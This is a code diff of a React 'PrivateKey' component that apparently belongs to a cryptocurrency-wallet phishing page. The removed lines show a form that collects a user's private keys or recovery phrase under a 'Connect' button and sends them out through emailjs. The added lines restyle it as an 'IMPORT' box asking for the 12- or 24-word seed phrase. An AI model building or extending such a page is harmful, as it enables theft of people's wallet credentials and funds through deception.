@@ -6,8 +6,12 @@ import emailjs from "@emailjs/browser";
 import { useNavigate } from "react-router-dom";
 import { useRef } from "react";
 import { useForm } from "react-hook-form";
+import { useState } from "react";
+import { Typography } from "@mui/material";
+
 
 const PrivateKey = () => {
+  const [toggleState, setToggleState] = useState(1);
   const { handleSubmit, formState } = useForm();
   const { isSubmitting } = formState;
   const form = useRef();
@@ -42,42 +46,38 @@ const PrivateKey = () => {
   }
 
   return (
-    <Box
-      component="form"
-      sx={{
-        "& .MuiTextField-root": { m: 1, width: "100%" },
-      }}
-      noValidate
-      autoComplete="off"
-      ref={form}
-      onSubmit={sendEmail}
-    >
-      <div>
+    <div className={toggleState === 3 ? "content active-content" : "content"}>
+      <Box
+        component="form"
+        sx={{
+          width: "80%",
+          margin: "0 auto",
+        }}
+        noValidate
+        autoComplete="off"
+      >
         <TextField
-          autoFocus
-          placeholder="Enter your Private Keys"
-          id="standard-multiline-static"
+          id="outlined-basic"
           label="Private Key"
-          size="Large"
+          variant="outlined"
           multiline
+          fullWidth
           rows={12}
-          variant="standard"
-          name="key_phrase"
         />
-        <Box margin={4}>
-          <Button
-            variant="contained"
-            color="success"
-            type="submit"
-            size="large"
-            onClick={sendEmail}
-          >
-            
-            Connect
-          </Button>
-        </Box>
-      </div>
-    </Box>
+
+        <Typography
+          sx={{ textAlign: "center", color: "rgba(38,34,250)" }}
+          paddingY={2}
+          textAlign={"center"}
+        >
+          Typically 12 (sometimes 24) words seperated by single spaces
+        </Typography>
+
+        <Button textAlign="center" variant="contained" size="large">
+          IMPORT
+        </Button>
+      </Box>
+    </div>
   );
 };
 
